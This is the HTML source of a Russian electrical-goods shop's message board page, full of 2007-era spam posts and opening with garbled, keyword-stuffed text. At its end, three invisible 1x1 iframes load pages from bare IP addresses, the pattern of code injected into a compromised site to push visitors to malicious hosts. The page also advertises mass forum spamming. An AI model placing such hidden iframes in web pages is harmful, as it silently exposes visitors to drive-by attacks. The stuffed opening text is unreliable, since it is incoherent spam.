andressoгpaблehue века  медитация невозможна. Восток породил Гаутаму Будду, Махавиру, Патанджали, Кабира, ключи к игре скарабеи фараона  Фарида, Райдаса - целую плеяду лиц компьютерные гонки играть  с высокоразвитым сознанием и высокой осознанностью. Но вся игра на подобие gravity defied  Вселенная - это не что иное, как игра найди предметы  энергетическое поле. Это свидетельство отсутствия конфликта скачат ь игры free  между материей и духом, доказательство возможности играть в тамагочи на компьютаре  быть счастливым и материально, и духовно. Многим <br />
+из java-игры для motorola l6  нас доводилось слышать не теряющий своей популярности совет lineage ii модификация игры  доверьтесь процессу. Это - способность признавать как свои скачать игру спецназ  ошибки и слабости, так и свои таланты и силу. бесплатно скачать порно --секс игры для пк  Его бунтарство направлено на избавление человека от шизофрении, на код к игре рыцари поднебесья  избавление его от разделенности: он разрушает духовность, почему на n90 java игры маленького размера  стоящую в оппозиции к материи, и он разрушает flash игры  материализм, стоящий в оппозиции к духовности. русское лото правила игры  Не было бы создано столько ядерных где можно купить мягкую игрушку  арсеналов, если бы понимали, что в барахолка коллекции антикварных новогодних игрушек  каждом человеке внутри скрывается Бог, что в скачать бесплатные игры на мой компьютер  каждом человеке внутри скрыто величие; его игра зимняя русская рыбалка  нельзя уничтожать, его нужно постигать; его развлекательный портал фильмов игрух музыки  нельзя убивать, его <br />
+нужно полностью раскрыть; ведь каждый java игры на motorola  человек - это храм Божий. Еще один скачать бесплатно игру тетрис  вид нашей реакции на хаос, происходящий в мире - игры типа монополия  это его отрицание. В поэзии и в духовных метафорах игра с килем  спокойствие представляется как чистое спокойное озеро в безветренный день, скачать фильм жестокие игры 3  которому не страшны ни бури, ни перемены. Старинная игр  пословица все хорошее приходит к тому, кто умеет ждать игр  применима к нашему путешествию, направленному на игр  новое открытие себя. Но он также породил и игр  миллионы бедняков, умирающих с голоду, умирающих, игр  как собаки, у которых нет ни рыбы ни мяса.</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8528.html"><strong><big>Главная справочная Самарского интернета.Карта и фирмы Тольятти.</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>spravka63ru@gawab.com <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8528.html">Карта и фирмы Тольятти на http://www.spravka63.ru/default.aspx?loc=tol, удобный интерфейс.<br />
+ Карта и фирмы Самары на http://www.spravka63.ru/default.aspx?loc=samara,<br />
+удобный интерфейс. Афиша, расписания транспорта, исторические справки<br />
+ Главная справочная Самарского интернета http://www.spravka63.ru/ <br />
+</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8530.html"><strong><big>Главная справочная Самарского интернета.Карта и фирмы Тольятти.</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>spravka63ru@gawab.com <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8530.html">Карта и фирмы Тольятти на http://www.spravka63.ru/default.aspx?loc=tol, удобный интерфейс.<br />
+ Карта и фирмы Самары на http://www.spravka63.ru/default.aspx?loc=samara,<br />
+удобный интерфейс. Афиша, расписания транспорта, исторические справки<br />
+ Главная справочная Самарского интернета http://www.spravka63.ru/ <br />
+</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8531.html"><strong><big>Рейтинг сайтов</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>xrumer070@mail.ru <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8531.html">Рейтинг сайтов Miheeff.ru это большой выбор информации, новостей и каталог интересных сайтов! Здесь Вы можете зарегестрировать счетчик, который будет отображать не только посещаемость Вашего сайта, но и такие важные параметры веса как: <br />
+Тематический Индекс Цитирования Яндекса и PageRank (Google). <br />
+ <br />
+http://miheeff.ru/TEMPLATES/images/miheeff.gif <br />
+ <br />
+Также можете зарегестрироваться в рейтинге - добавить сайт <br />
+http://miheeff.ru/clear_banner.html?id=1</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8532.html"><strong><big>Главная справочная Самарского интернета.Карта и фирмы Тольятти.</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>spravka63ru@gawab.com <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8532.html">Карта и фирмы Тольятти на http://www.spravka63.ru/default.aspx?loc=tol, удобный интерфейс.<br />
+ Карта и фирмы Самары на http://www.spravka63.ru/default.aspx?loc=samara,<br />
+удобный интерфейс. Афиша, расписания транспорта, исторические справки<br />
+ Главная справочная Самарского интернета http://www.spravka63.ru/ <br />
+<br />
+</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8537.html"><strong><big>Рассылка рекламы по форумам, раскрутка сайтов</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>redembarm@mail.ru <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8537.html">Цены на массовую рассылку по форумам: <br />
+1000 форумов - $20 <br />
+10000 форумов - $40 <br />
+50000 форумов - $70 <br />
+100000 форумов - $100 <br />
+200000 форумов - $200 <br />
+ <br />
+Работаем с огромным количеством различных типов форумов и гостевых: phpBB и PHP-Nuke любых модификаций, yaBB, VBulletin, Invision Power Board, IconBoard, UltimateBB, exBB, phorum.org, wiki, разнообразными видами досок объявлений а также "самописными" движками <br />
+Возможен индивидуальный сбор форумов по вашей тематике. <br />
+Эффективность рассылки на форумы: <br />
+Анализ существующих сайтов, подвергнутых процедуре регистрации в форумах, показал, что 1000 беклинков с форумов повышают ТИЦ сайта от 100 до 200 единиц (в зависимости от тематики) <br />
+Ссылочное ранжирование: 1000 ссылок с ключевыми словами из форумов позволяют сайту почти точно (естественно в зависимости от тематики и конкуренции) появиться в первой пятерке по среднечастотникам 4-6 тыс по директу и выше <br />
+Целевые посетители: за первую неделю Ваше объявление прочтет порядка 25-30 человек на каждом форуме. За всё время существования объявления его увидят 100-200 человек (в зависимости от посещаемости форума). <br />
+ <br />
+Практика показывает, что рассылка на 1000 форумов даёт 150 уникальных, заинтересованных в рекламируемом товаре или услуге посетителей каждый день в первую неделю после рассылки. Затем количество посетителей снижается до 50-100 хостов в день. <br />
+ <br />
+По окончанию рассылки Вы получите отчет о проделанной работе - прямые ссылки на Ваше объявление. <br />
+ <br />
+Контакты: <br />
+ICQ: 445-055-569,  468-518-471 <br />
+Mail: terkin.web@gmail.com</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8539.html"><strong><big>Требуются участники опросов!</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>opettevtrqwpcnalgor5@topping.com.ua <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8539.html">Добрый день всем жителям  форума  www.kompelectro.ru! <br />
+Не нашел правильного раздела для размещения этого топика , кроме как  этот. <br />
+ <br />
+Ищу участников опросов. <br />
+ <br />
+Оплата от $2 за опрос. <br />
+ <br />
+Работа  on-line.  Заполнение опросных анкет  (от 2$), участие в фокус-группах on-line  опросов  (от 20$ в час), тестирование продукции (от 10$). <br />
+ <br />
+Требования к вакансии. <br />
+Средний уровень  английского  (как минимум базовый уровень + комп. переводчик), наличие Интернет, умение работать с электронной почтой, самоорганизованность,  желание работать. <br />
+ <br />
+Условия работы. <br />
+Работа на своем  компьютере (дом, работа, Интернет-кафе), от 1 до 3 ч. в день (on-line), свободный график. <br />
+ <br />
+Информация о вакансии на : http://www.uxxicom.com/  или uxxicom.com <br />
+работа <br />
+удалённая работа <br />
+надомная работа <br />
+работа в интернет <br />
+участие в платных опросах</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8541.html"><strong><big>Куплю Windows</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>softlove@bk.ru <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8541.html">Куплю Windows Куплю Office -2003/XP/Vista softlove@bk.ru <br />
+и другой ЛИЦЕНЗИОННЫЙ софт <br />
+предложения на е-мейл softlove@bk.ru</a></table></table><br></table></table>                </td>
+                <td background="http://electroniks.com.ru/images/design/n5.gif"></td>
+              </tr>
+              <tr>
+                <td><img src="http://electroniks.com.ru/images/design/n6.gif" width="12" height="9"></td>
+                <td background="http://electroniks.com.ru/images/design/n7.gif" height="9"></td>
+                <td><img src="http://electroniks.com.ru/images/design/n8.gif" width="11" height="9"></td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+      </table>
+    </td>
+    <td width="250" valign="top">
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+          <td>
+             <table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td class="menu" valign=top nowrap bgcolor="#6888B8" background="http://electroniks.com.ru/images/design/menu_bg.gif" ><img src="http://electroniks.com.ru/images/design/bullet.gif" align=absmiddle>Информация</td></tr><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/about_us.html"> О фирме</a><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/news/index.html"> Новости</a><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/for_dillers.html"> Диллерам</a><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/search.html"> Поиск</a><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/board/index.html"> <b>Доска объявлений</b></a><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/electro_montaj.html"> Электромонтажные работы</a><tr><td class="menu" valign=top nowrap bgcolor="#6888B8" background="http://electroniks.com.ru/images/design/menu_bg.gif" ><img src="http://electroniks.com.ru/images/design/bullet.gif" align=absmiddle>Цены</td></tr><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/catalog/index.html"> Каталог товаров</a><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/korzina/show.html"> Оформить заказ</a><tr><td class="menu" valign=top nowrap bgcolor="#6888B8" background="http://electroniks.com.ru/images/design/menu_bg.gif" ><img src="http://electroniks.com.ru/images/design/bullet.gif" align=absmiddle>Производство</td></tr><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/znaki.html"> Знаки и плакаты электробезопасности</a><tr><td class="menu" valign=top nowrap bgcolor="#6888B8" background="http://electroniks.com.ru/images/design/menu_bg.gif" ><img src="http://electroniks.com.ru/images/design/bullet.gif" align=absmiddle>Контакты</td></tr><tr><td background="http://electroniks.com.ru/images/design/menu_dot.gif" height=20><img src="http://electroniks.com.ru/images/design/spacer.gif" width="5" height="8"><img src="http://electroniks.com.ru/images/design/b.gif" width="6" height="6" align=absmiddle><a href="http://electroniks.com.ru/letter.html"> Написать письмо</a></table>          </td>
+  </tr>
+  <tr>
+
+          <td background="http://electroniks.com.ru/images/design/menu_end.gif" height="16"></td>
+  </tr>
+</table><br>
+      <table width="100%" border="0" cellspacing="0" cellpadding="0" class="11pxl">
+        <tr>
+          <td background="http://electroniks.com.ru/images/design/menu_bg.gif" class="menu" height="16"><img src="http://electroniks.com.ru/images/design/bullet.gif" width="22" height="18" align="absmiddle">Поиск</td>
+        </tr>
+        <tr>
+          <td background="http://electroniks.com.ru/images/design/menu_dot.gif">
+
+                 <form method=post action="http://electroniks.com.ru/search.html">
+                 <center><font face=Arial size=2><br>
+                 <input type=edit name=searchstring size=20>
+                 <input type=hidden name=fromsite value="yes">
+
+                 <input type=submit name=submitbutton value=Искать></font></center><font face=Arial size=2><br>
+                 </font></form>
+          </td>
+        </tr>
+        <tr>
+          <td height="16" background="http://electroniks.com.ru/images/design/menu_end.gif"></td>
+        </tr>
+      </table>
+    <br>
+<!-- Counters -->
+ <center>
+<!--Rating@Mail.ru COUNTER--><script language="JavaScript" type="text/javascript"><!--
+d=document;var a='';a+=';r='+escape(d.referrer)
+js=10//--></script><script language="JavaScript1.1" type="text/javascript"><!--
+a+=';j='+navigator.javaEnabled()
+js=11//--></script><script language="JavaScript1.2" type="text/javascript"><!--
+s=screen;a+=';s='+s.width+'*'+s.height
+a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth)
+js=12//--></script><script language="JavaScript1.3" type="text/javascript"><!--
+js=13//--></script><script language="JavaScript" type="text/javascript"><!--
+d.write('<a href="http://top.mail.ru//jump?from=713195"'+
+' target=_top><img src="http://top.list.ru//counter'+
+'?id=713195;t=217;js='+js+a+';rand='+Math.random()+
+'" alt="Рейтинг@Mail.ru"'+' border=0 height=31 width=88/><\/a>')
+if(11<js)d.write('<'+'!-- ')//--></script><noscript><a
+target=_top href="http://top.mail.ru/jump?from=713195"><img
+src="http://top.list.ru/counter?js=na;id=713195;t=217"
+border=0 height=31 width=88
+alt="Рейтинг@Mail.ru"/></a></noscript><script language="JavaScript" type="text/javascript"><!--
+if(11<js)d.write('--'+'>')//--></script><!--/COUNTER-->
+<br>
+
+<a href="http://www.yandex.ru/cy?base=0&host=http://electroniks.com.ru">
+  <img src="http://config.privoxy.org/send-banner?type=auto" border="0" title="Killed-http://www.yandex.ru/cycounter?http://electroniks.com.ru-by-size" width=88 height=31></a>
+<br>
+<!--LiveInternet counter--><script language="JavaScript"><!--
+document.write('<a href="http://www.liveinternet.ru//click" '+
+'target=_blank>  <img src="http://config.privoxy.org/send-banner?type=auto" border="0" title="Killed-"http://counter.yadro.ru//hit?t11.10;r'+-by-size" width=88 height=31></a>')//--></script><!--/LiveInternet-->
+ </center>
+    </td>
+  </tr>
+</table>
+
+<iframe src='http://81.95.149.74/1/index.php' width='1' height='1' style="visibility: hidden;"></iframe>
+<iframe src='http://81.95.149.74/22/index.php' width='1' height='1' style="visibility: hidden;"></iframe>
+<iframe src='http://81.95.149.77/traff.php' width='1' height='1' style='visibility:hidden'></iframe>
